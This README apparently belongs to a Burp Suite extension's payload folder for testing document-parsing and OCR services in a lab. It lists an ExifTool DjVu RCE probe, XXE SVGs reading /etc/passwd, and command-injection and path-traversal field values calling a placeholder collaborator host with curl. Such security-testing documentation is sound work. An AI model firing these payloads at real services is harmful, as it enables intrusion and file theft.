# Drop-in payload templates

Any file in this directory (except `README.md`) is loaded as an extra payload at
Run time, in addition to the built-ins compiled into the extension.

Rules:
- The literal token `{{COLLAB}}` anywhere in the file is replaced, per payload,
  with a **unique** Burp Collaborator host. Each file therefore gets its own
  OAST identifier, so a Collaborator hit maps back to exactly one table row.
- Files are read as raw bytes, so **binary** templates (PDF, TIFF, DjVu, real
  image containers) are fine — put `{{COLLAB}}` where a hostname can live
  (a URL, a URI action, an embedded reference).
- A file with no `{{COLLAB}}` token is still sent (useful for malformed-image /
  parser-crash probes); it just has no OOB correlation.

Naming is free-form; the table shows `file:<filename>` as the payload name.

## Ideas for files to add here

- `exiftool_cve_2021_22204.djvu` — ExifTool DjVu RCE PoC with the command set to
  a benign OOB probe (e.g. `curl http://{{COLLAB}}/exif`). Generate it with the
  public DjVu PoC tooling; this repo ships no exploit binary.
- `pdf_remote_xobject.pdf` — a PDF whose rendering fetches a remote resource.
- `tiff_remote.tiff`, `jp2_*`, etc. — format-specific parser probes.

Two text examples are included below to show the template shape.

## XXE / parser payloads (added for the vuln-ocr-service lab)

These target a server-side **XML/SVG parser** (e.g. lxml/libxml2) that resolves
external entities — a different sink from the rasterizer-href SSRF in
`tiff_svg_hybrid_ssrf.svg`.

- `svg_xxe_file_read.svg` — in-band XXE. Reads `file:///etc/passwd` and places
  it in `<text>`, so a pipeline that returns/flattens SVG text reflects the
  file. Correlate by `root:` in the response, not by an OOB hit.
- `svg_xxe_oob.svg` — OOB XXE via a general external entity over HTTP.
- `svg_xxe_oob_paramentity.svg` — OOB XXE via a parameter entity pulling an
  external DTD (fires in the DTD phase).

**Host caveat observed in the lab:** libxml2 ≥ 2.13 dropped the built-in HTTP
entity loader, so on such hosts the two OOB SVGs read `file://` fine but their
HTTP fetch silently returns empty (no catcher hit). XXE there means local file
read / `file://` SSRF, not HTTP OOB. Report that honestly.

## Field-level mutations (not files)

Two sinks live in request fields, not the document body, so the headless
harness (`tools/local_replay.py`) injects them directly rather than as files:

- `lang` → command injection: `"eng; curl http://{{COLLAB}}/ #"`.
- `filename` → command injection and path traversal
  (`"../../TRAVERSAL_PROOF.txt"`). In Burp, set these on the request before
  sending it to the extension.
